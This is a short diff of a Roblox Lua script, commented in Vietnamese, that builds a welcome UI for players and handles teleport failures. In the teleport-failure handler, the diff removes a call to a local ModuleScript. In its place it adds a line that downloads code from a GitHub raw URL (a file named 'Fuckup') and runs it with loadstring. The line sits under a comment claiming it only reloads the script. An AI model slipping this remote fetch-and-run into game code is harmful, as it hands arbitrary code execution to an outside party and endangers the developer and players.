@@ -1,4 +1,4 @@
--- Tạo UI chào mừng người chơi vào game
+-- Tạo một UI chào mừng người chơi vào game
 local function createHelloUI(player)
     local screenGui = Instance.new("ScreenGui")
     local textLabel = Instance.new("TextLabel")
@@ -13,8 +13,7 @@ end
 -- Kiểm tra khi teleport
 game:GetService("TeleportService").TeleportInitFailed:Connect(function()
     -- Tải lại script mỗi khi teleport
-    local mainScript = require(game.ServerScriptService.MainScript)  -- Chỉnh sửa đường dẫn đến ModuleScript của bạn
-    mainScript.run()  -- Gọi hàm chính trong ModuleScript
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TDAIP/18im/refs/heads/main/Fuckup"))()
 end)
 
 -- Khi người chơi vào game, tạo UI chào mừng
